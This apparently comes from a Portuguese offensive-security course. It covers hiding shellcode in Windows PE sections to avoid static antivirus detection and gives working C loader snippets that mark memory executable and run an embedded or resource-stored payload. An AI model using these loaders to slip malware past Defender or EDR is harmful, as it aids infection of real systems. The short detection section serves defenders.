---
layout: cyber
section: evasao
title: "Payload Placement em Seções do PE"
---

# 10. Payload Placement em Seções do PE

## A Seção Escolhida Define o Footprint Estático

Onde o shellcode mora no binário muda **drasticamente** o footprint de detecção estática. Defender e AV inspecionam quatro coisas por seção: entropia (alta em `.text` = packer/cripto), strings/byte sequences conhecidas em `.rdata` e `.data`, tamanho anômalo de seção comparado a binários normais, e recursos em `.rsrc` (assinaturas de loader patterns). Escolher a seção certa = parecer benigno em scan estático antes mesmo do payload ser decriptado.

---

## Permissões e Características de Cada Seção

Cada seção do PE tem characteristics flags (`IMAGE_SCN_*`) que controlam permissões e visibilidade. Posicionamento típico:

| Seção | Permissões | Conteúdo esperado | Uso para payload |
|-------|-----------|-------------------|------------------|
| `.text` | RX | Código executável | Payload já-pronto-pra-rodar |
| `.data` | RW | Variáveis globais inicializadas | Payload + globais — alvo natural |
| `.rdata` | R | Strings constantes, IAT | Payload imutável (read-only no runtime) |
| `.rsrc` | R | Recursos (icons, manifestos, strings localizadas) | Payload encriptado como "BIN" resource |
| Custom (`.evil`) | qualquer | — | Trivial de detectar (não-padrão) |

---

## Na Prática

### 1. Placement em `.text` (linker pragmas MSVC)

```c
#pragma section(".text")
__declspec(allocate(".text")) unsigned char Payload[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, /* ... */
};
```

Payload já tem permissão `EXECUTE`; basta jump pra ele.

```c
void (*pFunc)() = (void(*)())Payload;
pFunc();  // Sem VirtualProtect
```

**Problema**: alta entropia em `.text` é red flag (código compilado tem entropia ~5-6; shellcode encriptado tem ~7.5+). Defender ML model flagga.

### 2. Placement em `.data`

```c
unsigned char Payload[] = { 0xfc, 0x48, /* ... */ };
// Linker coloca em .data por padrão (variável global mutável)
```

Para executar:
```c
DWORD dwOld;
VirtualProtect(Payload, sizeof(Payload), PAGE_EXECUTE_READ, &dwOld);
((void(*)())Payload)();
```

`.data` ter conteúdo binário/aleatório é menos suspeito (globals são tipicamente binary blobs).

### 3. Placement em `.rdata`

```c
#pragma section(".rdata")
__declspec(allocate(".rdata")) const unsigned char Payload[] = { 0xfc, /* ... */ };
```

Read-only → precisa `VirtualProtect` antes de exec. Vantagem: `.rdata` tem entropia natural baixa-média (strings e tabelas IAT).

### 4. Placement em `.rsrc` (Resource Section)

Mais stealth. Payload guardado como recurso "BIN" custom.

#### Criar resource (.rc):

```rc
PAYLOAD RCDATA "payload.bin"
```

#### Extrair em runtime:

```c
HRSRC hRes = FindResourceA(NULL, "PAYLOAD", RT_RCDATA);
DWORD dwSize = SizeofResource(NULL, hRes);
HGLOBAL hGlob = LoadResource(NULL, hRes);
PVOID pData = LockResource(hGlob);

// pData → buffer com payload (read-only)
// Copiar para RWX se necessário
LPVOID pExec = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(pExec, pData, dwSize);
((void(*)())pExec)();
```

**Vantagem**: binário com resources é totalmente normal (icons, manifestos, version info). Adicionar mais um resource RCDATA = invisível em static scan.

**Combinar com encryption**: payload em `.rsrc` encriptado com AES + decrypt-at-runtime. Entropia do resource fica alta, mas atributo de recurso justifica (resources comprimidos têm entropia alta naturalmente).

---

## Trade-offs por Seção

| Seção | Entropia OK? | Precisa VirtualProtect? | Detecção estática | Detecção dinâmica |
|-------|-------------|------------------------|-------------------|-------------------|
| `.text` | ❌ (sempre baixa esperada) | ❌ | Alta — entropy anomaly | Baixa (já exec) |
| `.data` | ✅ | ✅ | Média | Média (RW→RX trigger) |
| `.rdata` | ✅ (médio) | ✅ | Baixa | Média |
| `.rsrc` | ✅✅ (resources são "qualquer coisa") | ✅ | Muito baixa | Média |
| `.text` custom name | ❌ | ❌ | Muito alta — flag óbvia | Baixa |

---

## Combinação com Encryption

Payload em `.rsrc` + AES + key derivada de string runtime:

```c
// .rsrc: payload XOR-encrypted
HRSRC hRes = FindResourceA(NULL, "PAYLOAD", RT_RCDATA);
// [...] carrega + descriptografa em buffer próprio
// [...] VirtualAlloc RWX + copy + jmp
```

→ ver `11_payload_encryption.md`.

---

## Detecção

- **Capa**: assinaturas Yara verificam padrões "shellcode em .data global".
- **PE-sieve**: detecta entropia anômala por seção.
- **Defender ML**: classifica entropy distribution.
- **EDR runtime**: hook em `VirtualProtect(W^X)` flagga RW→RX em página de imagem.

## Leitura Complementar

- MITRE T1027 — Obfuscated Files — https://attack.mitre.org/techniques/T1027/
- hasherezade — PE-Sieve — https://github.com/hasherezade/pe-sieve
- Sandfly Security — entropy analysis blogs
